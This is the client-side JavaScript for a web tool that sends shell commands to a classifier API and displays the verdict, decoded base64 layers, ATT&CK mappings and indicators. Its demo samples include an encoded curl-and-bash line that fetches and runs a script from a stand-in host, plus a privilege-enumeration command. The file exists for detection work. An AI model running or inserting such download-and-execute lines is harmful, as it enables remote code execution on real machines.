'use strict';
const $ = id => document.getElementById(id);
const esc = value => String(value).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const list = value => Array.isArray(value) ? value : value == null || value === '' ? [] : [value];
const unique = values => [...new Set(values.flat().filter(v => v != null && String(v).trim()).map(String))];
const chips = (values, type = '', linked = false) => unique(values).map(value => `<span class="token ${type}"${linked ? ` data-token="${esc(value)}" tabindex="0"` : ''}>${esc(value)}</span>`).join('');
const SAMPLES = {
  retrieval: btoa('curl -fsSL https://demo.example.org/agent.sh -o /tmp/agent.sh && bash /tmp/agent.sh'),
  identity: 'd2hvYW1pIC9hbGwgJiYgbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=',
  benign: 'Get-ChildItem -Path C:\\Users -Recurse -Filter *.txt'
};
// This page investigates text only. Sample commands are never executed.
const CORE_ROWS = ['Executables', 'Flags', 'Arguments', 'Operators'];
const TIMEOUT_MS = 45000;
let activeScan = false;
let lastResult = null;
let animationState = null;
let sampleFrame = 0;
const motionPreference = matchMedia('(prefers-reduced-motion: reduce)');
let techniqueNames = {};
fetch('/static/attack-techniques.json').then(r => r.ok ? r.json() : {}).then(names => {
  techniqueNames = names;
  if (lastResult && !animationState) renderMitre(lastResult);
}).catch(() => {});

// A deliberately small, quote-aware lexer, not a shell evaluator or a full AST.
// Only unquoted operators delimit executable positions. Quoted payloads stay intact.
function tokenize(command) {
  const tokens = [];
  let value = '', quote = '', started = false;
  const flush = () => { if (started) tokens.push({value, operator:false}); value = ''; started = false; };
  for (let i = 0; i < command.length; i++) {
    const c = command[i];
    if (quote) {
      if (c === quote) quote = '';
      else if ((c === '\\' && command[i + 1] === quote) || (c === '`' && quote === '"' && command[i + 1])) value += command[++i];
      else value += c;
      continue;
    }
    if (c === '"' || c === "'") { quote = c; started = true; continue; }
    if (/\s/.test(c)) { flush(); if (c === '\n' && tokens.length && !tokens.at(-1).operator) tokens.push({value:'newline',operator:true}); continue; }
    if ('&|;<>'.includes(c)) {
      flush();
      let op = c;
      if ((c === '&' || c === '|' || c === '>') && command[i + 1] === c) op += command[++i];
      tokens.push({value:op,operator:true});
      continue;
    }
    value += c; started = true;
  }
  flush();
  return tokens;
}
function parseStructure(command, ev) {
  const executables = [], flags = [], args = [], operators = [];
  let nextExecutable = true, redirectTarget = false;
  for (const token of tokenize(command)) {
    if (token.operator) {
      operators.push(token.value);
      if (/^[<>]/.test(token.value)) redirectTarget = true;
      else nextExecutable = true;
      continue;
    }
    const value = token.value;
    if (redirectTarget) { args.push(value); redirectTarget = false; }
    else if (nextExecutable && !/^[A-Za-z_][\w]*=/.test(value)) { executables.push(value); nextExecutable = false; }
    else if (/^--?[^\d\s]/.test(value) || /^\/[A-Za-z][\w-]*(?::.*)?$/.test(value) && ev.platform === 'windows') flags.push(value);
    else args.push(value);
  }
  // /all is a Windows switch even if the specialist omitted platform evidence.
  const windows = ev.platform === 'windows' || executables.some(x => /^(net|reg|cmd(?:\.exe)?|powershell(?:\.exe)?|Get-\w+|schtasks|vssadmin)$/i.test(x)) || /[A-Za-z]:\\/.test(command);
  if (windows) for (let i = args.length - 1; i >= 0; i--) if (/^\/[A-Za-z][\w-]*(?::.*)?$/.test(args[i])) flags.unshift(...args.splice(i,1));
  const urls = unique([...list(ev.urls), ...(command.match(/https?:\/\/[^\s"'<>|;&]+/gi) || [])]);
  const ips = unique([...list(ev.ips), ...(command.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []).filter(x => x.split('.').every(n => +n <= 255))]);
  const files = unique([...list(ev.file_paths), ...[...executables,...args].filter(x => !/^https?:\/\//i.test(x) && (/^(?:[A-Za-z]:[\\/]|\.{0,2}\/|~\/)/.test(x) || /\.(?:exe|dll|ps1|bat|cmd|sh|txt|zip|bin)$/i.test(x)))]);
  const registry = unique([...list(ev.registry_paths), ...args.filter(x => /^(?:HKLM|HKCU|HKCR|HKU|HKCC|HKEY_\w+)[\\:]/i.test(x))]);
  const platform = ev.platform && ev.platform !== 'unknown' ? ev.platform : windows ? 'Windows (inferred)' : executables.some(x => /^(bash|sh|curl|wget|ls|chmod|cat)$/.test(x)) || files.some(x => x.startsWith('/')) ? 'Unix-like (inferred)' : null;
  return {
    Executables:unique(executables.length ? executables : list(ev.executable)),
    Flags:unique([...flags,...list(ev.high_signal_flags)]),
    Arguments:unique(args), Operators:unique(operators),
    Platform:list(platform), Obfuscation:unique(list(ev.obfuscation_markers)),
    URLs:urls, IPs:ips, Files:files, 'Registry keys':registry
  };
}
function renderBreakdown(rows, loading = false) {
  const type = name => ({Executables:'executable',Flags:'flag',Arguments:'argument',Operators:'operator',Platform:'feature',Obfuscation:'warning',URLs:'url',IPs:'ip',Files:'file','Registry keys':'registry'}[name] || 'artifact');
  $('breakdown').innerHTML = Object.entries(rows).filter(([name,values]) => loading || CORE_ROWS.includes(name) || values.length).map(([name,values],i) => `<div class="breakdown-row" style="--row:${i}"><dt>${esc(name)}</dt><dd><div class="tokens">${loading ? ghostBars(2) : values.length ? chips(values,type(name),true) : '<span class="empty-value">None detected</span>'}</div></dd></div>`).join('');
}
function ghostBars(count = 3) {
  return `<div class="ghost-bars" aria-hidden="true">${Array.from({length:count},(_,i)=>`<span class="skeleton" style="--ghost:${i}"></span>`).join('')}</div>`;
}
const percent = value => {
  if (value == null || value === '' || !Number.isFinite(Number(value))) return null;
  // The current API explicitly sends percentages, including values below 1%.
  return Math.max(0,Math.min(100,Number(value)));
};
function renderProbabilities(d = {}) {
  const source = d.label_probabilities || d.class_probabilities || {};
  const normalized = Object.fromEntries(Object.entries(source).map(([k,v]) => [k.toLowerCase(),v]));
  $('probabilities').innerHTML = ['Benign','Context_Dependent','Malicious'].map(label => {
    const p = percent(normalized[label.toLowerCase()] ?? (label === 'Context_Dependent' ? normalized.suspicious : null));
    return `<div class="prob-row ${label === 'Context_Dependent' ? 'suspicious' : label.toLowerCase()}"><span>${label.replace('_',' ')}</span><div class="meter" aria-hidden="true"><span data-probability="${p ?? 0}" style="width:${p ?? 0}%"></span></div><span class="prob-value">${p == null ? '—' : p.toFixed(1)+'%'}</span></div>`;
  }).join('');
}
function decodeBase64(value) {
  const input = value.trim();
  if (input.length < 8 || input.length > 65536 || input.length % 4 || !/^[A-Za-z0-9+/]+={0,2}$/.test(input)) return null;
  try {
    const bytes = Uint8Array.from(atob(input), c => c.charCodeAt(0));
    const utf16 = bytes.length % 2 === 0 && bytes.filter((v,i) => i % 2 && v === 0).length > bytes.length / 5;
    const decoded = new TextDecoder(utf16 ? 'utf-16le' : 'utf-8',{fatal:true}).decode(bytes);
    return decoded.length > 3 && !/[\x00-\x08\x0e-\x1f]/.test(decoded) ? decoded : null;
  } catch { return null; }
}
function decodeLayers(original, finalCommand) {
  const layers = [];
  let text = original;
  for (let i = 0; i < 5; i++) {
    const decoded = decodeBase64(text);
    if (!decoded || decoded === text) break;
    layers.push(decoded); text = decoded;
    if (text.trim() === finalCommand.trim()) return layers;
  }
  // Only display reconstructed layers if the chain agrees with the API result.
  return [];
}
function renderObfuscation(d, original) {
  const ev = d.evidence || {};
  const decoded = d.deobfuscated_cmd || d.decoded_payload || ev.deobfuscated_command;
  const markers = unique(list(ev.obfuscation_markers));
  const detected = ev.uses_obfuscation || ev.uses_encoded_payload || markers.length || decoded && decoded.trim() !== original.trim();
  $('obfuscationSection').hidden = !detected;
  if (!detected) { $('obfuscationSection').innerHTML = ''; return; }
  const layers = decoded ? decodeLayers(original,decoded) : [];
  if (!markers.length && layers.length) markers.push('BASE64');
  if (!markers.length) markers.push('ENCODING UNSPECIFIED');
  let html = `<div class="obfuscation-panel"><div class="obfuscation-title"><span class="warning-icon" aria-hidden="true">⚠</span><h2 id="obfuscationHeading">OBFUSCATION DETECTED</h2>${markers.map(x=>`<span class="encoding-badge">${esc(x.toUpperCase())}</span>`).join('')}</div><div class="decode-flow"><div class="decode-step"><span class="code-label">ORIGINAL COMMAND</span><pre><code>${esc(original)}</code></pre></div>`;
  const shown = layers.length ? layers : decoded ? [decoded] : [];
  shown.forEach((command,i) => {
    const final = i === shown.length - 1;
    html += `<div class="decode-step decoded-step"><span class="code-label"><span class="decode-arrow" aria-hidden="true">↳</span> ${final ? 'DEOBFUSCATED COMMAND' : 'DECODED LAYER '+(i+1)}</span><pre><code${final ? ' id="decodedCommand"' : ''}>${esc(command)}</code></pre></div>`;
  });
  html += '</div>';
  if (!decoded) html += '<p class="decode-note">Obfuscation detected; the API did not return a decoded command.</p>';
  else if (layers.length > 1) html += '<p class="decode-note">Intermediate layers verified against the API’s decoded command.</p>';
  $('obfuscationSection').innerHTML = html + '</div>';
}
const FEATURE_TEXT = {
  enumerates_identity:'Enumerates current user identity and account information.',
  enumerates_network_config:'Enumerates network configuration.',
  downloads_remote_resource:'Downloads a resource from a remote URL.',
  executes_inline_code:'Executes inline code.', runs_interpreter:'Runs commands through an interpreter.',
  modifies_registry_autorun:'Modifies a registry autorun entry to run at sign-in.',
  creates_scheduled_task:'Creates a scheduled task.', creates_or_modifies_service:'Creates or changes a system service.',
  deletes_shadow_copies:'Deletes shadow copies used for recovery.', reads_credential_store:'Reads a credential store.',
  remote_execution_or_session:'Starts a remote execution or session.', archive_create:'Creates an archive.', archive_extract:'Extracts an archive.',
  uses_encoded_payload:'Uses an encoded command payload.', uses_obfuscation:'Conceals command text with obfuscation.',
  uses_signed_proxy_binary:'Uses a signed utility that can proxy execution.',
  download_remote_resource:'Downloads a resource from a remote URL.',execute_inline_code:'Executes inline code.',execute_interpreter:'Runs commands through an interpreter.',remote_execution:'Starts a remote execution or session.',archive_data:'Creates an archive.',extract_archive:'Extracts an archive.',use_encoded_payload:'Uses an encoded command payload.',use_obfuscation:'Conceals command text with obfuscation.',use_signed_proxy_binary:'Uses a signed utility that can proxy execution.'
};
function renderBehavior(d, rows, command) {
  const ev = d.evidence || {}, beh = d.behavior || {};
  const features = unique([...list(ev.semantic_features),...list(beh.action_tags)]);
  const bullets = unique(features.map(x => FEATURE_TEXT[x]).filter(Boolean));
  // Concrete command actions supplement specialist output when evidence is sparse.
  if (/\bwhoami\b/i.test(command) && !features.includes('enumerates_identity')) bullets.push('Enumerates current user identity.');
  if (/\bnet\s+localgroup\s+administrators\b/i.test(command)) bullets.push('Lists members of the local Administrators group.');
  if (/\bGet-ChildItem\b/i.test(command)) bullets.push(/-Recurse\b/i.test(command) ? 'Recursively lists files matching the supplied path and filter.' : 'Lists files and directories at the supplied path.');
  if (rows.Executables.some(x => /^(curl|wget)(?:\.exe)?$/i.test(x)) && rows.URLs.length && !features.includes('downloads_remote_resource') && !features.includes('download_remote_resource')) bullets.push('Downloads a resource from the supplied URL.');
  if (rows.Flags.includes('-o') && rows.Files.length) bullets.push('Writes the downloaded resource to the specified file destination.');
  if (rows.Executables.some(x => /^(bash|sh)$/i.test(x)) && rows.Files.length) bullets.push('Runs the script file through a shell interpreter.');
  if (!bullets.length) bullets.push(d.analyst_hint || ev.evidence_summary || 'No distinctive behavior reported. Review the command structure for context.');
  $('behaviorCategory').textContent = String(beh.stage || d.attack_stage || 'Behavior context not returned').toUpperCase();
  $('behaviorBullets').innerHTML = unique(bullets).map(x=>`<li>${esc(x)}</li>`).join('');
  $('semanticTags').innerHTML = chips(list(ev.semantic_features),'semantic');
}
function renderMitre(d) {
  const heading = $('mitreHeading');
  const headingLabel = heading?.querySelector('span');
  const headingDetail = heading?.querySelector('small');
  const families = d.attack_families;
  if (families && Array.isArray(families.all_family_scores)) {
    if (headingLabel) headingLabel.textContent = 'ATTACK FAMILIES';
    if (headingDetail) headingDetail.textContent = 'MULTI-LABEL / 11 FAMILIES';
    const selected = list(families.predicted_families);
    $('mitreList').innerHTML = selected.length ? selected.map(row =>
      `<span class="technique family-technique"><span class="technique-name">${esc(row.family)}</span><span class="technique-score" aria-label="${Number(row.probability).toFixed(1)} percent model score">${Number(row.probability).toFixed(1)}%</span></span>`
    ).join('') : '<p class="muted">No family exceeded the model threshold</p>';
    return;
  }
  if (headingLabel) headingLabel.textContent = 'THREAT MAPPING';
  if (headingDetail) headingDetail.textContent = 'MITRE ATT&CK / TOP 5';
  const techniques = [...list(d.MITRE_codes)].sort((a,b)=>(Number(b?.confidence) || 0)-(Number(a?.confidence) || 0)).slice(0,5);
  $('mitreList').innerHTML = techniques.length ? techniques.map(t => {
    const id = String(typeof t === 'string' ? t : t.code || t.id || '');
    const name = t.name || t.technique_name || techniqueNames[id];
    const valid = /^T\d{4}(?:\.\d{3})?$/.test(id);
    const confidence = percent(t.confidence);
    const content = `<code>${esc(id || 'No ID')}</code><span class="technique-name">${esc(name || 'ATT&CK technique (name unavailable)')}</span>${confidence != null ? `<span class="technique-score" style="--score-strength:${techniques[0]?.confidence > 0 ? Math.max(.62, Number(t.confidence) / Number(techniques[0].confidence)) : 1}" aria-label="${confidence.toFixed(1)} percent model score">${confidence.toFixed(1)}%</span>` : ''}`;
    return valid ? `<a class="technique" href="https://attack.mitre.org/techniques/${id.replace('.','/')}/" target="_blank" rel="noopener noreferrer">${content}<span aria-label="opens in new tab">↗</span></a>` : `<span class="technique">${content}</span>`;
  }).join('') : '<p class="muted">None mapped</p>';
}
function renderIndicators(d = {}, rows = {}) {
  const ev = d.evidence || {}, ioc = d.ioc_summary || {};
  const groups = {
    IOCs:unique([...list(ioc.urls),...list(ioc.domains),...list(ioc.ips),...list(ioc.notable_files),...list(ioc.registry_paths),...list(rows.URLs),...list(rows.IPs),...list(rows.Files),...list(rows['Registry keys'])]),
    LOLBins:unique(list(ev.lolbin_matches)),
    Network:unique([...list(rows.URLs),...list(rows.IPs),...list(ev.domains),...list(ev.ports).map(x=>'Port '+x),...list(ev.remote_targets)])
  };
  $('indicators').innerHTML = Object.entries(groups).map(([name,values]) => `<article class="indicator-card indicator-${name.toLowerCase()}${values.length ? ' active' : ''}"><h3>${name}${values.length ? `<span class="count-badge" aria-label="${values.length} detected">${values.length}</span>` : ''}</h3>${values.length ? '<div class="tokens">'+chips(values,'artifact')+'</div>' : '<p>None detected</p>'}</article>`).join('');
}
function renderAdvanced(d = {}) {
  const beh = d.behavior || {}, gk = d.gatekeeper || {};
  const fields = {
    model_type:beh.model_type ?? d.model_type,
    behavior_encoder:d.behavior_encoder ?? (beh.model_type === 'behavior_encoder' ? beh.model_type : null),
    routing_policy:d.routing_policy, decision_margin:d.decision_margin,
    model_view:gk.model_view, view_policy:gk.view_policy,
    score_type:d.score_type, calibration:d.calibration,
    'behavior fallback reason':d.provenance?.behavior_fallback_reason,
    'runner-up score':gk.model_second_confidence != null ? gk.model_second_confidence+'%' : null,
    'fired-rule strength':d.evidence?.rule_strength
  };
  $('modelDetails').innerHTML = Object.entries(fields).map(([key,value]) => `<div class="model-row"><dt>${esc(key)}</dt><dd>${esc(value == null || typeof value === 'object' && !Object.keys(value).length ? 'Not returned' : typeof value === 'object' ? JSON.stringify(value) : String(value))}</dd></div>`).join('');
  $('advanced').open = false;
}
function timingText(d) {
  return d.elapsed_ms != null && Number.isFinite(Number(d.elapsed_ms)) ? Number(d.elapsed_ms)+' ms' : null;
}
function renderGpuMemory(d = {}) {
  const memory = d.gpu_memory;
  const format = value => value != null && Number.isFinite(Number(value)) && Number(value) >= 0 ? (Number(value)/1048576).toFixed(1)+' MiB' : '—';
  const measured = memory?.status === 'measured';
  $('gpuCommandValue').textContent = measured ? format(memory.command_peak_bytes) : memory?.status === 'cpu' ? 'N/A' : '—';
  $('gpuDevice').textContent = measured ? memory.device_name || 'CUDA GPU' : memory?.status === 'cpu' ? 'CPU inference' : memory ? 'Measurement unavailable' : d.label ? 'Telemetry not returned' : 'Awaiting scan';
  $('gpuCommandValue').title = measured ? `Peak above baseline · total ${format(memory.peak_allocated_bytes)} · baseline ${format(memory.baseline_allocated_bytes)} · reserved ${format(memory.peak_reserved_bytes)}` : memory?.status === 'cpu' ? 'This command ran on CPU; no GPU VRAM was used.' : 'Peak PyTorch allocation above the resident baseline';
}
function setStatus(text, error = false) {
  $('scanStatus').textContent = text;
  $('scanStatus').classList.toggle('error',error);
  $('scanStatus').classList.toggle('done',!error && text.startsWith('Done in '));
  $('scanStatus').setAttribute('role',error ? 'alert' : 'status');
}
function markCommand(code, rows) {
  if (!code) return;
  const text = code.textContent;
  const types = new Map();
  // More specific artifact types override the general argument classification.
  for (const [name,type] of [['Arguments','argument'],['Executables','executable'],['Flags','flag'],['Operators','operator'],['Files','file'],['Registry keys','registry'],['IPs','ip'],['URLs','url']]) {
    for (const value of list(rows[name])) if (value !== 'newline') types.set(String(value),type);
  }
  const values = [...types.keys()].sort((a,b)=>b.length-a.length);
  if (!values.length) return;
  const pattern = new RegExp(values.map(v=>v.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')).join('|'),'g');
  let html = '', offset = 0;
  for (const match of text.matchAll(pattern)) {
    html += esc(text.slice(offset,match.index))+`<span class="command-span ${types.get(match[0])}" data-token="${esc(match[0])}" tabindex="0">${esc(match[0])}</span>`;
    offset = match.index+match[0].length;
  }
  code.innerHTML = html+esc(text.slice(offset));
}
function renderResults(d, original) {
  renderGpuMemory(d);
  const ev = d.evidence || {};
  const command = d.deobfuscated_cmd || d.decoded_payload || ev.deobfuscated_command || original;
  const rows = parseStructure(command,ev);
  if (ev.uses_obfuscation || command !== original) rows.Obfuscation = rows.Obfuscation.length ? rows.Obfuscation : [decodeLayers(original,command).length ? 'BASE64' : 'Detected / type unspecified'];
  $('results').classList.remove('empty-state');
  renderObfuscation(d,original);
  $('plainCommand').hidden = !!$('decodedCommand');
  $('commandText').textContent = command;
  markCommand($('decodedCommand') || $('commandText'),rows);
  $('verdictSection').className = 'verdict-section '+(d.label === 'Context_Dependent' ? 'suspicious' : String(d.label).toLowerCase());
  $('verdictLabel').textContent = String(d.label).replace('_',' ').toUpperCase();
  const conf = percent(d.label_confidence);
  $('confidenceValue').textContent = conf == null ? '—' : conf.toFixed(1)+'%';
  $('confidenceCaption').textContent = d.score_type === 'validation_temperature_scaled' ? 'calibrated score' : 'uncalibrated score';
  $('analysisTime').textContent = timingText(d) || 'Timing unavailable';
  renderProbabilities(d);
  $('breakdownCaption').textContent = command !== original ? 'Decoded command structure' : 'Command structure';
  renderBreakdown(rows);
  renderBehavior(d,rows,command);
  renderMitre(d);
  renderIndicators(d,rows);
  renderAdvanced(d);
}
function renderEmpty(loading = false) {
  renderGpuMemory();
  $('results').classList.add('empty-state');
  $('obfuscationSection').hidden = true;
  $('obfuscationSection').innerHTML = '';
  $('plainCommand').hidden = true;
  $('verdictSection').className = 'verdict-section';
  $('verdictLabel').textContent = loading ? 'ANALYZING COMMAND' : 'AWAITING COMMAND';
  $('confidenceValue').textContent = '—';
  $('analysisTime').textContent = '';
  renderProbabilities();
  $('breakdownCaption').textContent = 'Command structure';
  renderBreakdown(Object.fromEntries([...CORE_ROWS,'Platform','Obfuscation','URLs','Files'].map(x=>[x,[]])),true);
  $('behaviorCategory').innerHTML = ghostBars(1);
  $('behaviorBullets').innerHTML = `<li class="ghost-list">${ghostBars(3)}</li>`;
  $('semanticTags').innerHTML = '';
  $('mitreList').innerHTML = `<div class="ghost-panel">${ghostBars(3)}</div>`;
  $('indicators').innerHTML = ['IOCs','LOLBins','Network'].map(name=>`<article class="indicator-card"><h3>${name}</h3>${ghostBars(2)}</article>`).join('');
  $('modelDetails').innerHTML = ghostBars(3);
  $('advanced').open = false;
}
// All final DOM and dimensions are in place before the reveal starts. Animation
// changes opacity, transforms, bar widths, and a text overlay, never panel sizes.
function animateResults(d) {
  if (motionPreference.matches || skipRequested) return Promise.resolve();
  return new Promise(resolve => {
    const container = $('results');
    container.classList.add('choreographing');
    $('skipAnimation').setAttribute('aria-hidden','false');
    $('skipAnimation').tabIndex = 0;
    const reveal = (elements, start, step, duration = 180) => [...elements].forEach((el,i)=>{
      el.classList.add('reveal');
      el.style.setProperty('--reveal-delay',Math.min(start+i*step,1250)+'ms');
      el.style.setProperty('--reveal-duration',duration+'ms');
    });
    reveal(container.querySelectorAll('.encoding-badge'),40,40);
    const rows = container.querySelectorAll('.breakdown-row');
    rows.forEach((row,i)=>{
      const start = 260+Math.min(i,9)*75;
      reveal([row.querySelector('dt')],start,0);
      reveal(row.querySelectorAll('.token, .empty-value'),start,25);
    });
    reveal(container.querySelectorAll('#behaviorCategory, #behaviorBullets li, #semanticTags .token'),970,35,150);
    reveal(container.querySelectorAll('#mitreList > *'),1000,60,180);
    reveal(container.querySelectorAll('.indicator-card .tokens, .indicator-card p'),1180,45,160);
    reveal(container.querySelectorAll('.count-badge'),1200,45,170);
    const code = $('decodedCommand');
    let overlay = null, plaintext = '';
    if (code) {
      plaintext = code.textContent;
      code.classList.add('scramble-plaintext');
      overlay = document.createElement('span');
      overlay.className = 'scramble-overlay';
      overlay.setAttribute('aria-hidden','true');
      code.parentElement.appendChild(overlay);
    }
    const confidence = percent(d.label_confidence);
    const bars = [...container.querySelectorAll('[data-probability]')];
    bars.forEach(bar=>bar.style.width='0%');
    if (confidence != null) $('confidenceValue').textContent = '0.0%';
    const started = performance.now();
    const state = {frame:0,finish:null};
    const finish = () => {
      if (animationState !== state) return;
      cancelAnimationFrame(state.frame);
      if (overlay) overlay.remove();
      if (code) code.classList.remove('scramble-plaintext');
      $('confidenceValue').textContent = confidence == null ? '—' : confidence.toFixed(1)+'%';
      bars.forEach(bar=>bar.style.width=bar.dataset.probability+'%');
      container.classList.remove('choreographing');
      container.querySelectorAll('.reveal').forEach(el=>{
        el.classList.remove('reveal');
        el.style.removeProperty('--reveal-delay');
        el.style.removeProperty('--reveal-duration');
      });
      $('skipAnimation').setAttribute('aria-hidden','true');
      $('skipAnimation').tabIndex = -1;
      animationState = null;
      // A late local technique-name lookup must not interrupt the choreography.
      renderMitre(d);
      resolve();
    };
    state.finish = finish;
    animationState = state;
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
    const tick = now => {
      const elapsed = now-started;
      if (overlay) {
        const progress = Math.min(1,elapsed/350);
        overlay.textContent = [...plaintext].map((c,i)=>/\s/.test(c) || i < plaintext.length*progress ? c : alphabet[(i+Math.floor(elapsed/35))%alphabet.length]).join('');
        if (progress === 1) { overlay.remove(); overlay = null; code.classList.remove('scramble-plaintext'); }
      }
      const progress = Math.max(0,Math.min(1,(elapsed-1060)/300));
      const eased = 1-Math.pow(1-progress,3);
      if (confidence != null) $('confidenceValue').textContent = (confidence*eased).toFixed(1)+'%';
      bars.forEach(bar=>bar.style.width=(Number(bar.dataset.probability)*eased)+'%');
      if (elapsed >= 1500) finish();
      else state.frame = requestAnimationFrame(tick);
    };
    state.frame = requestAnimationFrame(tick);
  });
}
let skipRequested = false;
let returnFocusAfterReveal = false;
function skipAnimation(event) {
  if (!activeScan) return;
  if (event?.target?.closest('#skipAnimation') || document.activeElement === $('skipAnimation')) returnFocusAfterReveal = true;
  skipRequested = true;
  animationState?.finish();
  document.body.classList.remove('input-scanning');
}
motionPreference.addEventListener('change',event=>{if(event.matches) skipAnimation();});
document.addEventListener('pointerdown',event=>{
  if (!activeScan) return;
  if (event.target.closest('#skipAnimation')) event.preventDefault();
  skipAnimation(event);
},true);
document.addEventListener('keydown',event=>{if(activeScan) skipAnimation(event);},true);
$('skipAnimation').addEventListener('click',skipAnimation);
function highlightToken(value) {
  document.querySelectorAll('#breakdown [data-token], .command-span').forEach(el=>el.classList.toggle('linked-highlight',!!value && el.dataset.token === value));
}
const linkedTarget = event => event.target.closest('#breakdown [data-token], .command-span');
$('results').addEventListener('pointerover',event=>{const token=linkedTarget(event); if(token) highlightToken(token.dataset.token);});
$('results').addEventListener('pointerout',event=>{if(linkedTarget(event)) highlightToken(null);});
$('results').addEventListener('focusin',event=>{const token=linkedTarget(event); if(token) highlightToken(token.dataset.token);});
$('results').addEventListener('focusout',()=>highlightToken(null));
function growInput() {
  const input = $('cmdInput');
  input.style.height = 'auto';
  input.style.height = Math.min(320,Math.max(144,input.scrollHeight+2))+'px';
  input.style.overflowY = input.scrollHeight > 318 ? 'auto' : 'hidden';
}
let sampleTarget = null;
function finishSample() {
  cancelAnimationFrame(sampleFrame);
  if (sampleTarget != null) { $('cmdInput').value = sampleTarget; sampleTarget = null; growInput(); }
}
function loadSample(value) {
  cancelAnimationFrame(sampleFrame);
  sampleTarget = value;
  $('cmdInput').removeAttribute('aria-invalid');
  setStatus('Ready');
  if (motionPreference.matches) { finishSample(); $('scanBtn').focus(); return; }
  const started = performance.now();
  $('cmdInput').value = '';
  const type = now => {
    $('cmdInput').value = value.slice(0,Math.ceil(value.length*Math.min(1,(now-started)/300)));
    growInput();
    if (now-started >= 300) { sampleTarget = null; $('scanBtn').focus(); }
    else sampleFrame = requestAnimationFrame(type);
  };
  sampleFrame = requestAnimationFrame(type);
}
async function runScan() {
  if (activeScan) { skipAnimation(); return; }
  finishSample();
  const original = $('cmdInput').value.trim();
  if (!original) {
    setStatus('Paste a command to analyze.',true);
    $('cmdInput').setAttribute('aria-invalid','true'); $('cmdInput').focus(); return;
  }
  activeScan = true; skipRequested = false; returnFocusAfterReveal = false;
  $('cmdInput').removeAttribute('aria-invalid');
  $('cmdInput').readOnly = true;
  $('scanBtn').disabled = true; $('demoSample').disabled = true;
  $('buttonLabel').textContent = 'ANALYZING';
  $('results').setAttribute('aria-busy','true');
  document.body.classList.add('loading','input-scanning');
  if (!lastResult) renderEmpty(true);
  setStatus('Analyzing');
  const controller = new AbortController();
  const timeout = setTimeout(()=>controller.abort(),TIMEOUT_MS);
  try {
    const response = await fetch('/scan/free',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:original}),signal:controller.signal});
    let data;
    try { data = await response.json(); } catch { throw new Error('Unreadable response. Try again.'); }
    if (!response.ok) throw new Error(data?.error || 'Service unavailable (HTTP '+response.status+').');
    if (!data || !['benign','context_dependent','suspicious','malicious'].includes(String(data.label).toLowerCase())) throw new Error('Incomplete analysis. Try again.');
    clearTimeout(timeout);
    renderResults(data,original); lastResult = data;
    $('results').scrollTop = 0;
    await animateResults(data);
    setStatus(timingText(data) ? 'Done in '+timingText(data) : 'Done · timing unavailable');
  } catch (error) {
    animationState?.finish();
    if (!lastResult) renderEmpty();
    setStatus(controller.signal.aborted ? 'Timed out after 45 seconds. Try again.' : 'Error: '+error.message,true);
  } finally {
    clearTimeout(timeout); activeScan = false;
    $('cmdInput').readOnly = false;
    $('scanBtn').disabled = false; $('demoSample').disabled = false; $('buttonLabel').textContent = 'ANALYZE';
    if (returnFocusAfterReveal || document.activeElement === $('skipAnimation')) $('scanBtn').focus();
    $('results').setAttribute('aria-busy','false');
    document.body.classList.remove('loading','input-scanning');
  }
}
$('scanForm').addEventListener('submit',e=>{e.preventDefault();runScan();});
$('cmdInput').addEventListener('keydown',e=>{if(e.key === 'Enter' && !e.isComposing && (!e.shiftKey || e.ctrlKey || e.metaKey)){e.preventDefault();runScan();}});
$('cmdInput').addEventListener('input',()=>{
  cancelAnimationFrame(sampleFrame); sampleTarget = null;
  $('cmdInput').removeAttribute('aria-invalid');
  if (!activeScan) setStatus('Ready');
  growInput();
});
$('demoSample').addEventListener('change',e=>{if(SAMPLES[e.target.value]) loadSample(SAMPLES[e.target.value]);});
renderEmpty(); growInput();
